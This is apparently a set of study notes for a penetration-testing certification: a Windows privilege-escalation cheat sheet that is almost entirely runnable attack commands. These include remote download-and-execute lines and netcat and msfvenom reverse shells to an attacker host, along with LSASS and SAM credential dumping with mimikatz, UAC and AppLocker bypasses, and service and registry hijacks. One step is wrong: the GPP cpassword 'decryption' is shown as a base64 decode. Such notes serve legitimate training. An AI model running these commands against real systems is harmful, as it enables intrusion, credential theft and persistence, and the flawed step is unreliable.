# Windows Privilege Escalation — Complete CPTS Guide

## Quick Win Checklist

- [ ] `whoami /priv` — check for [[SeImpersonatePrivilege]] or [[SeAssignPrimaryTokenPrivilege]]
- [ ] `whoami /groups` — check for [[SeBackupPrivilege]], [[SeRestorePrivilege]], [[SeTakeOwnershipPrivilege]], [[SeCreateTokenPrivilege]]
- [ ] `systeminfo` — check OS version, hotfixes
- [ ] `wmic qfe get Caption,HotFixID,InstalledOn` — check installed patches
- [ ] `wmic service list brief` — check for unquoted service paths
- [ ] `icacls C:\ProgramData\*` — check writable directories
- [ ] `sc query` — list services
- [ ] `accesschk.exe -uwcqv "Authenticated Users" *` — check service permissions
- [ ] `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run` — startup programs
- [ ] `tasklist /v` — running processes
- [ ] `netstat -ano` — listening ports
- [ ] Run [[WinPEAS]]
- [ ] Run [[PowerUp]]
- [ ] Run [[Seatbelt]]

---

## 1. Initial Enumeration

### System Information

```cmd
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
hostname
ver
wmic os get caption,version,buildnumber,osarchitecture
wmic computersystem get name,totalphysicalmemory,manufacturer,model
```

### User & Group Enumeration

```cmd
whoami
whoami /priv
whoami /groups
whoami /all

net user
net user <username>
net localgroup
net localgroup Administrators
net localgroup "Remote Desktop Users"
net localgroup "Remote Management Users"

query user
qwinsta
```

### Patch / Hotfix Enumeration

```cmd
wmic qfe get Caption,HotFixID,InstalledOn
systeminfo | findstr "KB"

# PowerShell
Get-HotFix | Format-Table -AutoSize
Get-WmiObject -Class Win32_QuickFixEngineering
```

### Process Enumeration

```cmd
tasklist /v
tasklist /svc
wmic process list brief

# PowerShell
Get-Process | Format-Table -AutoSize
Get-WmiObject -Class Win32_Process | Select-Object Name,ProcessId,CommandLine
```

### Network Enumeration

```cmd
ipconfig /all
netstat -ano
netstat -ano | findstr LISTEN
netstat -ano | findstr ESTABLISHED
arp -a
route print
```

### Service Enumeration

```cmd
wmic service list brief
sc query
sc query state= all
sc queryex

# PowerShell
Get-Service
Get-WmiObject -Class Win32_Service | Select-Object Name,PathName,State,StartName
```

### File & Directory Enumeration

```cmd
dir /a C:\
dir /s C:\*.config
dir /s C:\*.txt 2>nul
dir /a C:\Users\
dir C:\ProgramData\
dir C:\Program Files\
dir C:\temp\
dir /a /b C:\Users\*\AppData\Local\Temp
```

### Registry Enumeration

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall
reg query "HKLM\SYSTEM\CurrentControlSet\Services"
reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s 2>nul | findstr ImagePath
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentVersion
```

### PowerShell Enumeration

```powershell
Get-WmiObject Win32_StartupCommand
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch "system32"}
Get-WmiObject Win32_Process | Select-Object Name,CommandLine,ProcessId
Get-ChildItem Env: | Format-Table -AutoSize
Get-LocalUser
Get-LocalGroupMember Administrators
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```

---

## 2. Automated Tools

### [[WinPEAS]]

```cmd
# Transfer and run
certutil -urlcache -f http://<attacker-ip>/winpeas.exe winpeas.exe
winpeas.exe
winpeas.exe > output.txt
winpeas.exe cmd searchfast    # Faster search
winpeas.exe cmd    # All checks

# PowerShell with obfuscation
IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/winPEAS.ps1')
```

### [[PowerUp]] (PowerShell)

```powershell
# Load
IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/PowerUp.ps1')
# Or locally
powershell -ep bypass
. .\PowerUp.ps1

# Commands
Invoke-AllChecks                    # All checks
Invoke-PrivescAudit                 # Audit services
Get-ServiceUnquoted                 # Unquoted service paths
Get-ServiceFilePermission           # Weak permissions
Get-ServicePermission               # Service permissions
Get-ModifiablePath                  # Writable paths
Get-ModifiableService               # Modifiable services
Get-UnquotedService                 # Unquoted services
Invoke-ServiceAbuse -Name <service> -UserName <user> -LocalGroup Administrators
Invoke-ServiceAbuse -Name <service> -Command "net localgroup Administrators <user> /add"
```

### [[Seatbelt]]

```cmd
# Seatbelt.exe
Seatbelt.exe -group=all
Seatbelt.exe -group=system
Seatbelt.exe -group=user
Seatbelt.exe -group=audit
Seatbelt.exe -group=misc
Seatbelt.exe WindowsAutoRun,WindowsFirewall,WindowsScheduledTasks

# Output to file
Seatbelt.exe -group=all -outputfile=seatbelt_output.txt
```

### [[JAWS]] (PowerShell)

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/jaws-enum.ps1')
. .\jaws-enum.ps1
Invoke-JAWS
```

### [[PrivescCheck]]

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/PrivescCheck.ps1')
Invoke-PrivescCheck
Invoke-PrivescCheck -Extended
Invoke-PrivescCheck -Report PrivescCheck.html -Format HTML
```

### [[SharpUp]]

```cmd
SharpUp.exe
SharpUp.exe audit
```

---

## 3. Service Exploitation

### Unquoted Service Paths

#### Enumerate

```cmd
wmic service get name,pathname,displayname,startmode | findstr /i /v "C:\Windows"
wmic service get name,pathname | findstr /i /v "C:\\Windows"

sc qc <service-name>
sc query <service-name>

# PowerShell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notmatch "C:\\Windows" -and $_.PathName -notmatch '"'}
Get-CimInstance -ClassName Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -notmatch 'C:\\Windows'}
```

#### Exploit (Manual)

```
Example path: C:\Program Files\My App\My Service\service.exe
                              ^^^^   ^^^^^^^^^
                              Spaces create ambiguity

Steps:
1. Check permissions on each directory in the path
2. If C:\Program Files\My App\ is writable, upload malicious My Service.exe
3. Restart service or wait for reboot

icacls "C:\Program Files\My App\"
# If BUILTIN\Users has (W) or (F), upload payload
```

#### Create Malicious Binary

```cmd
# Compile on attacker (C#)
csc /target:exe /out:service.exe service.cs

# service.cs
using System;
using System.Diagnostics;
using System.ServiceProcess;

public class Program {
    public static void Main() {
        Process.Start("cmd.exe", "/c net localgroup Administrators <user> /add");
        // Or reverse shell
        // Process.Start("powershell", "-c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')");
    }
}
```

#### Exploit — Restart Service

```cmd
# Check service start mode
sc qc <service-name>
# If Auto, wait for reboot or trigger restart

# If manually restartable
net stop <service-name>
net start <service-name>

# If you have SeShutdownPrivilege
shutdown /r /t 0
```

### Weak Service Permissions

#### Enumerate

```cmd
# Using accesschk from Sysinternals
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula

# Check specific service
accesschk.exe -ucqv <service-name> /accepteula
sc sdshow <service-name>
```

#### Exploit — Change Service Binary Path

```cmd
# If Users have SERVICE_CHANGE_CONFIG or WRITE permission
sc config <service-name> binPath="cmd.exe /c net localgroup Administrators <user> /add"
sc config <service-name> binPath="C:\payload.exe"
net start <service-name>

# Or
sc stop <service-name>
sc start <service-name>
```

#### Exploit — PowerUp

```powershell
Get-ServicePermission
Invoke-ServiceAbuse -Name <service> -Command "net localgroup Administrators <user> /add"
```

### Weak Service Binary Permissions

#### Enumerate

```cmd
# Check if the service binary file is writable
icacls "C:\Path\To\Service.exe"
wmic service get name,pathname | findstr /i /v "C:\\Windows"
```

#### Exploit

```cmd
# If BUILTIN\Users has (W) or (F) on the binary
# Replace it with a malicious binary
copy C:\payload.exe C:\Path\To\Service.exe
net stop <service-name>
net start <service-name>
```

### Path Interception

```cmd
# Find a service path that doesn't exist
sc qc <service-name>
# Example: C:\Program Files\Custom\svc.exe

# Check if C:\Program Files\Custom\ exists
# If not, create directories and drop malicious svc.exe
icacls "C:\Program Files"
# If writable -> create Custom\svc.exe

mkdir "C:\Program Files\Custom"
copy C:\payload.exe "C:\Program Files\Custom\svc.exe"
net start <service-name>
```

---

## 4. AlwaysInstallElevated

### Check Registry

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerShell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
```

### Exploit

```cmd
# Both must be set to 1

# Create malicious MSI (on attacker)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f msi -o malicious.msi

# Transfer to target
certutil -urlcache -f http://<attacker-ip>/malicious.msi malicious.msi

# Install
msiexec /quiet /qn /i malicious.msi

# Or create MSI with PowerUp
Write-UserAddMSI
```

---

## 5. Token Impersonation

### [[SeImpersonatePrivilege]]

#### Enumerate

```cmd
whoami /priv
# Look for: SeImpersonatePrivilege - Enabled
```

#### PrintSpoofer

```cmd
# PrintSpoofer - works on Windows 10/11, Server 2016/2019/2022
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe <attacker-ip> 4444 -e cmd"
PrintSpoofer.exe -d 3 -c "whoami | out-file C:\windows\temp\output.txt"
```

#### GodPotato / GodPotato.NET

```cmd
# GodPotato - works on Windows Server 2016-2022, Win 10/11
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe <attacker-ip> 4444 -e cmd"
```

#### JuicyPotato / JuicyPotatoNG

```cmd
# JuicyPotato - works on Windows 7/8/10, Server 2008/2012/2016
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami" -t *
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c nc.exe <attacker-ip> 4444 -e cmd" -t *

# JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c nc.exe <attacker> 4444 -e cmd"
```

#### RoguePotato / RogueWinRM

```cmd
# With SeImpersonate
RoguePotato.exe -r <attacker-ip> -e "cmd.exe" -l 9999
RogueWinRM.exe -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
```

#### SweetPotato / SharpEfsPotato

```cmd
# SweetPotato
SweetPotato.exe -e cmd
SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe
```

### [[SeAssignPrimaryTokenPrivilege]]

```cmd
whoami /priv
# Look for: SeAssignPrimaryTokenPrivilege
# Combine with SeImpersonate for PrivExchange / Potato attacks
```

### [[SeBackupPrivilege]]

#### Enumerate

```cmd
whoami /priv
# Look for: SeBackupPrivilege - Enabled
```

#### Exploit — Backup SAM/SYSTEM

```cmd
# Create backup of SAM and SYSTEM hives
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
reg save hklm\security C:\temp\security

# Transfer to attacker and dump hashes
secretsdump.py -sam sam -system system LOCAL
# Or use samdump2 / pwdump
```

#### Exploit — Backup with diskshadow

```cmd
# Alternative if reg save is blocked
# Create a shadow copy
diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\temp\meta.cab
DISKSHADOW> add volume C: alias myvolume
DISKSHADOW> create
DISKSHADOW> expose %myvolume% Z:
DISKSHADOW> exit
copy Z:\Windows\System32\config\sam C:\temp\sam
copy Z:\Windows\System32\config\system C:\temp\system
```

### [[SeRestorePrivilege]]

```cmd
# Can modify system files — replace service binaries
sc config <service> binPath="C:\payload.exe"
```

### [[SeTakeOwnershipPrivilege]]

```cmd
# Take ownership of protected files
takeown /f C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SAM /grant <user>:F
```

### [[SeCreateTokenPrivilege]]

```cmd
# Can create custom tokens — use with SeAssignPrimaryTokenPrivilege
# Exploit with Token Manipulation tools
```

### [[SeLoadDriverPrivilege]]

```cmd
# Load a kernel driver — advanced exploit
# Install a vulnerable or malicious driver
```

### [[SeDebugPrivilege]]

```cmd
# Can debug any process — inject into SYSTEM process
# Using procdump
procdump.exe -accepteula -ma <system-pid> lsass.dmp

# Using mimikatz
mimikatz.exe privilege::debug sekurlsa::logonpasswords exit

# Using PowerShell
$process = Get-Process -Name lsass
$handle = OpenProcess(0x1F0FFF, $false, $process.Id)
# ... advanced token stealing
```

---

## 6. Registry Exploitation

### AutoRun / Startup Registry Keys

```cmd
# Current user
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

# Local machine
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

# 32-bit apps on 64-bit (WOW6432Node)
reg query HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
```

### Weak Registry Permissions

#### Enumerate

```cmd
# Check permissions on service registry key
reg query "HKLM\SYSTEM\CurrentControlSet\Services\<service>" /v ImagePath
accesschk.exe -k "HKLM\SYSTEM\CurrentControlSet\Services\*" /accepteula

# Check if Users can modify service registry
accesschk.exe -k "HKLM\SYSTEM\CurrentControlSet\Services" /accepteula
subinacl /keyreg "HKLM\SYSTEM\CurrentControlSet\Services" /display
```

#### Exploit

```cmd
# If Users have write permission on a service registry key
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<service>" /v ImagePath /t REG_EXPAND_SZ /d "C:\payload.exe" /f
net start <service-name>
```

### AlwaysInstallElevated (See Section 4)

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## 7. Startup Folder

### Enumerate

```cmd
# All Users Startup
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"

# Current User Startup
dir "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

### Exploit

```cmd
# If writable, drop a malicious shortcut or script
copy C:\payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\malicious.exe"
# Or create shortcut
powershell -c "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\backdoor.lnk'); $s.TargetPath = 'C:\Windows\System32\cmd.exe'; $s.Arguments = '/c C:\payload.exe'; $s.Save()"
```

---

## 8. Scheduled Tasks

### Enumerate

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo CSV /v > tasks.csv

# PowerShell
Get-ScheduledTask | Format-Table -AutoSize
Get-ScheduledTask | Where-Object {$_.TaskPath -notmatch "Microsoft"}
```

### Task with Weak Permissions

```cmd
# Check permissions on a scheduled task
schtasks /query /fo LIST /v | findstr "Task To Run:"
schtasks /query /fo LIST /v | findstr "Author:"
schtasks /query /fo LIST /v | findstr "Run As User:"

# Check writable task script
icacls "C:\Path\To\Task\Script.ps1"
icacls "C:\Path\To\Task\Script.vbs"
```

### Exploit

```cmd
# If the task runs as SYSTEM and the script/binary is writable
echo "net localgroup Administrators <user> /add" >> C:\Path\To\Task\Script.bat
# Or replace with reverse shell

# Wait for scheduled trigger or force
schtasks /run /tn "\TaskName"
```

---

## 9. DLL Hijacking

### Enumerate Missing DLLs

```cmd
# Process Monitor (sysinternals) — run on target or analyze locally
# Filter: Result is "NAME NOT FOUND"
# Filter: Path ends with .dll

# Manual — check running service binaries
wmic service get name,pathname
# Look for paths where DLLs are loaded from user-writable directories
```

### Windows Known DLL Search Order

```
1. Memory (already loaded DLLs)
2. KnownDLLs registry key
3. Application directory   <-- Hijackable
4. System32
5. SysWOW64 (for 32-bit)
6. Windows directory
7. Current directory       <-- Hijackable
8. PATH environment
```

### Exploit

```cmd
# Create malicious DLL that exports the expected functions
# Compile on attacker with msfvenom or custom C code

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f dll -o malicious.dll
# Place in directory where application loads DLL from
copy malicious.dll C:\Program Files\App\missing.dll
```

### Common Hijackable DLLs

```
wlbsctrl.dll
wlnotify.dll
WptsExtensions.dll
MSVCR100.dll
MSVCR110.dll
MSVCR120.dll
MFC100.dll
MFC110.dll
MFCM110.dll
```

---

## 10. UAC Bypass

### Check UAC Level

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# If EnableLUA = 1 and ConsentPromptBehaviorAdmin = 0 -> UAC disabled for admin
# If EnableLUA = 1 and ConsentPromptBehaviorAdmin = 2 -> Always notify (hard)
# If EnableLUA = 1 and ConsentPromptBehaviorAdmin = 5 -> Default (notify only when app changes)
```

### UAC Bypass Techniques

#### FodHelper

```cmd
# Works on Windows 10/11
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe /c C:\payload.exe" /f
fodhelper.exe
```

#### EventVwr

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe /c C:\payload.exe" /f
eventvwr.exe
```

#### DiskCleanup / SilentCleanup

```cmd
# SilentCleanup runs at high integrity
reg add HKCU\Environment /v windir /d "cmd.exe /c C:\payload.exe && " /f
schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I
```

#### CMSTP

```cmd
# Works on older Windows
cmstp.exe /s C:\payload.inf
```

### PowerShell UAC Bypass

```powershell
# Use Start-Process with Verb RunAs
Start-Process powershell -Verb RunAs
Start-Process cmd -Verb RunAs

# Or bypass with token manipulation (requires SeImpersonatePrivilege)
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.Verb = "runas"
$psi.FileName = "cmd.exe"
$psi.Arguments = "/c whoami"
$proc = [System.Diagnostics.Process]::Start($psi)
```

---

## 11. Credential Theft

### SAM Hive Dumping

```cmd
# Registry method (requires admin)
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
reg save hklm\security C:\temp\security

# Or using cmd
reg save hklm\sam sam
reg save hklm\system system

# Transfer to attacker
# secretsdump.py -sam sam -system system LOCAL
```

### LSASS Dumping

```cmd
# Task Manager method (GUI)
# Task Manager -> Details -> lsass.exe -> Create dump file

# Procdump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# On x64 to dump 32-bit
procdump.exe -accepteula -ma <lsass-pid> lsass.dmp

# Comsvcs.dll method (can bypass AV)
# Find lsass PID
tasklist /v | findstr lsass
# Create dump
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\temp\lsass.dmp full

# Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
sekurlsa::ekeys
lsadump::sam
lsadump::cache
lsadump::secrets
token::elevate
```

### Unattended Installation Files

```cmd
dir /s C:\Unattend.xml 2>nul
dir /s C:\Panther\Unattend.xml 2>nul
dir /s C:\Windows\Panther\Unattend.xml 2>nul
dir /s C:\Windows\System32\sysprep\sysprep.xml 2>nul
dir /s C:\Windows\System32\sysprep\unattend.xml 2>nul
dir /s *unattend*.xml 2>nul
dir /s *autounattend*.xml 2>nul

# PowerShell
Get-ChildItem -Path C:\ -Recurse -Filter *unattend*.xml -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter *sysprep*.xml -ErrorAction SilentlyContinue
```

### web.config / Application Configs

```cmd
dir /s web.config 2>nul
dir /s app.config 2>nul
dir /s *.config 2>nul
dir /s *.xml 2>nul

# Common locations
dir C:\inetpub\www\web.config 2>nul
dir C:\inetpub\wwwroot\web.config 2>nul
dir C:\Program Files\*\web.config 2>nul
```

### Group Policy Preferences (GPP)

```cmd
# Look for Groups.xml with cpassword
dir /s Groups.xml 2>nul
dir /s Services.xml 2>nul
dir /s ScheduledTasks.xml 2>nul
dir /s DataSources.xml 2>nul
dir /s Printers.xml 2>nul
dir /s Drives.xml 2>nul

# Common path
dir C:\ProgramData\Microsoft\Group Policy\History\*\MACHINE\Preferences\Groups\Groups.xml
dir SYSVOL\*\Policies\*\MACHINE\Preferences\Groups\Groups.xml 2>nul

# Decrypt cpassword (AES-256)
# On Kali:
gpp-decrypt <cpassword>
# Or PowerShell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cpassword))
```

### PowerShell History

```powershell
# PSReadLine history file (PowerShell 5+)
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Older PowerShell history
type $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\*.txt
```

### Stored Credentials

```cmd
# Windows Credential Manager
cmdkey /list
dir /a C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
dir C:\Users\<user>\AppData\Local\Microsoft\Credentials\

# PowerShell
Get-ChildItem -Path "C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\" -Force
Get-ChildItem -Path "C:\Users\<user>\AppData\Local\Microsoft\Credentials\" -Force
```

### Saved RDP Connections

```cmd
dir /s *.rdp 2>nul
type C:\Users\<user>\Documents\Default.rdp
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
```

### Browser Credentials

```cmd
# Chrome (if presence)
dir C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data
# Firefox
dir C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\
```

---

## 12. Additional Techniques

### Writable %PATH% Directory

```cmd
# Check PATH directories
echo %PATH%
# Check if any are writable
icacls C:\Windows\System32
icacls C:\Windows
icacls C:\WINDOWS\system32\wbem
# If writable, drop a DLL those directories, or overwrite a common command

# DLL Sideloading via PATH
# If a service loads a DLL without full path and a PATH dir is writable
```

### Mounted VHD / VHDX Files

```cmd
# Look for mounted drives
mountvol
wmic logicaldisk get caption,volumename
# Look for VHD files
dir /s *.vhd 2>nul
dir /s *.vhdx 2>nul
```

### AlwaysInstallElevated via Group Policy (See Section 4)

### AppLocker Bypass

```cmd
# Check AppLocker policy
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2

# Bypass techniques:
# 1. Alternate locations: C:\Windows\Temp, C:\Windows\Tasks
# 2. Alternate interpreters: cscript, wscript, mshta
# 3. Rundll32
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"cmd\");")
# 4. Regsvr32
regsvr32 /s /n /u /i:http://<attacker>/payload.sct scrobj.dll
# 5. MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\payload.xml
# 6. InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile=/LogToConsole=false /U C:\payload.dll
```

### PowerSploit

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/PowerSploit.ps1')
Get-ModifiableService
Invoke-ServiceAbuse
```

### Local Privilege Escalation — Known Exploits

| CVE / Name | Windows Version | Tool |
|-----------|----------------|------|
| MS16-032 | Win 7/8/8.1/10, Server 2008/2012 | PowerShell |
| MS17-010 (EternalBlue) | Win 7/Server 2008 R2 | Metasploit |
| CVE-2021-36934 (HiveNightmare) | Win 10 1809+ | sam-dump |
| CVE-2021-1675 (PrintNightmare) | Win 7-10, Server 2008-2019 | PowerShell |
| CVE-2022-21907 (HTTP.sys) | Win 10/11, Server 2022 | |
| CVE-2023-21768 (AFD.sys) | Win 11 22H2 | |
| CVE-2024-26234 | Proxy Driver | |
| Hot Potato | Win 7/8/10, Server 2008/2012 | potato.exe |
| MS11-046 (AFD.sys) | Win 7, Server 2008 | |
| MS14-070 (Tcpip.sys) | Win 7, Server 2008 R2 | |
| MS15-051 | Win 7/8/8.1 | |
| MS16-135 (Win32k) | Win 7-10 | |

---

## Quick Reference — Command Cheat Sheet

| Goal | Command |
|------|---------|
| User info | `whoami` / `whoami /priv` / `whoami /groups` |
| System info | `systeminfo` |
| Patches | `wmic qfe get Caption,HotFixID,InstalledOn` |
| Users | `net user` / `net user <user>` |
| Groups | `net localgroup` / `net localgroup Administrators` |
| Services | `wmic service list brief` / `sc query` |
| Processes | `tasklist /v` / `wmic process list brief` |
| Network | `netstat -ano` / `ipconfig /all` |
| Listening ports | `netstat -ano \| findstr LISTEN` |
| AutoRun | `reg query HKLM\...\Run` |
| Scheduled tasks | `schtasks /query /fo LIST /v` |
| Startup folder | `dir "C:\ProgramData\...\Startup"` |
| Unquoted paths | `wmic service get name,pathname \| findstr /i /v "C:\\Windows"` |
| Unattend files | `dir /s *unattend*.xml 2>nul` |
| SAM | `reg save hklm\sam sam` |
| LSASS | `procdump.exe -ma lsass.exe lsass.dmp` |
| GPP passwords | `dir /s Groups.xml 2>nul` |
| AlwaysInstallElevated | `reg query HKLM\...\AlwaysInstallElevated` |
| UAC | `reg query HKLM\...\System /v EnableLUA` |
| PowerShell history | `type $env:APPDATA\...\ConsoleHost_history.txt` |
| Credential Manager | `cmdkey /list` |
| wget (certutil) | `certutil -urlcache -f http://<ip>/file.exe file.exe` |
| PowerShell download | `IEX(New-Object Net.WebClient).DownloadString('http://<ip>/script.ps1')` |
| WinPEAS | Run `winpeas.exe` |
| PowerUp | Run `Invoke-AllChecks` |

---

## References

- [[WinPEAS]]
- [[PowerUp]]
- [[Seatbelt]]
- [[JAWS]]
- [[SharpUp]]
- [[PrivescCheck]]
- [[Mimikatz]]
- [[PrintSpoofer]]
- [[GodPotato]]
- [[JuicyPotato]]
- [[PowerSploit]]
- [[GTFOBins - Windows]]
